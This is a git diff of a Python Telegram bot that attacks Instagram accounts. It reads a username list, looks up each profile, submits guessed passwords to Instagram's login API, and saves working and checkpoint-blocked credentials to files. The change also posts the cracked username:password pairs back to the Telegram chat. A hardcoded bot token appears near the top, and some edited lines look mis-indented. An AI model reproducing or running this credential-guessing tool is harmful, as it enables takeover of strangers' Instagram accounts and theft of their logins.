@@ -15,6 +15,7 @@ bot = telebot.TeleBot('6777370057:AAFH6G5iqiaBloief_xk356wz3T7uPK7R4g')
 user_states = {}
 target = []
 followers=[]
+user_hack=[]
 
 def save_cookie(cookie):
   with open('cookie.txt', 'w') as file:
@@ -92,8 +93,9 @@ def get_cookie(message):
   
 @bot.message_handler(func=lambda message: message.text == '!crack')
 def start_crack(message):
-  chat_id = message.chat.id
+  
   try:
+    chat_id = message.chat.id
     cookie = load_cookie()
     url = 'https://i.instagram.com/api/v1/accounts/current_user/'
     ig_cookie = change_to_json(cookie)
@@ -126,15 +128,15 @@ def start_crack(message):
       teks = f"Login successfully!\nLogin as *{username}*.\n\nYou want crack from?"
       bot.send_chat_action(chat_id, 'typing')
       time.sleep(1)
-      bot.reply_to(c, teks, parse_mode='Markdown', reply_markup=markup)
+      bot.reply_to(message, teks, parse_mode='Markdown', reply_markup=markup)
     else:
       bot.send_chat_action(chat_id,'typing')
       time.sleep(1)
-      bot.reply_to(chat_id, response.json())
+      bot.reply_to(message, str(response.text) + '\n\nType *!set* and delete your old cookie.', parse_mode='Markdown')
   except FileNotFoundError as err:
     bot.send_chat_action(chat_id, 'typing')
     time.sleep(1)
-    bot.reply_to(message, err)
+    bot.reply_to(chat_id, err)
     
     
 @bot.callback_query_handler(func=lambda call: True)
@@ -265,17 +267,18 @@ def main_crack(chat_id, message_id, cookie):
         'Host': 'i.instagram.com'
     }
     
-    with open('usernames.txt', 'r') as file:
-        usernames = file.readlines()
-    
-    for username in usernames:
+    try:
+      with open('usernames.txt', 'r') as file:
+          usernames = file.readlines()
+      
+      for username in usernames:
         request_count += 1
         usr_name = username.strip()  # Menghilangkan newline
         
         url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={usr_name}"
         response = requests.get(url, headers=headers, cookies=cookie,allow_redirects=False)
         time.sleep(1)
-        print(response.text)
+        print(response.json().get('status'))
         if response.status_code == 200:
           try:
             data = response.json()["data"]["user"]["full_name"]
@@ -299,39 +302,43 @@ def main_crack(chat_id, message_id, cookie):
             response_log = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
             time.sleep(2)
             
-            
+            teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json().get("status")}*'
+            bot.send_chat_action(chat_id, 'typing')
+            time.sleep(0.5)
+            bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
                 
             if response_log.status_code == 200 and 'logged_in_user' in response_log.json():
                 #if request_count % 5 == 0:
                   #try:
-                    teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json()["message"]}*'
-                    bot.send_chat_action(chat_id, 'typing')
-                    time.sleep(0.5)
-                    bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
-                    user_data = f"{usr_name}:{password}"
-                    save_oke(user_data + '\n')
+                    # teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json()["message"]}*'
+#                     bot.send_chat_action(chat_id, 'typing')
+#                     time.sleep(0.5)
+#                     bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
+              user_data = f"{usr_name}:{password}"
+              user_hack.append(user_data)
+              save_oke(user_data + '\n')
+              
                     #os.remove('usernames.txt')
                   #except Exception as err:
                     #print(err)
             elif 'checkpoint' in response_log.json():
                 #if request_count % 5 == 0:
                   #try:
-                    teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json()["message"]}*'
-                    bot.send_chat_action(chat_id, 'typing')
-                    time.sleep(0.5)
-                    bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
-                    user_data = f"{usr_name}:{password}"
-                    save_cp(user_data + '\n')
+                    # teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json()["message"]}*'
+#                     bot.send_chat_action(chat_id, 'typing')
+#                     time.sleep(0.5)
+#                     bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
+              user_data = f"{usr_name}:{password}"
+              user_hack.append(user_data)
+              save_cp(user_data + '\n')
                     #os.remove('usernames.txt')
                   #except Exception as err:
                     #print(err)
-            else:
+            #else:
                 #if request_count % 5 == 0:
                   #try:
-                    teks = f'Trying login as *{usr_name}*!\n\nStatus: *{response_log.json().get("message", "Failed to login")}*'
-                    bot.send_chat_action(chat_id, 'typing')
-                    time.sleep(0.5)
-                    bot.edit_message_text(teks, chat_id, message_id, parse_mode="Markdown")
+           
+          
           except KeyError:
             print(f"User data not found for {usr_name}")
             continue
@@ -339,7 +346,12 @@ def main_crack(chat_id, message_id, cookie):
             print(response.text)
             #print(f"Failed to fetch user info for {usr_name}")
             continue
-        
+      bot.send_message(chat_id,f'Finished cracking!\n\nResult: *{user_hack}*\nTotal: *{len(user_hack)}*', parse_mode='Markdown')
+    except FileNotFoundError:
+      pass
+    
+    
+    #bot.send_message(chat_id, 'Finished cracking!')  
         
         
         
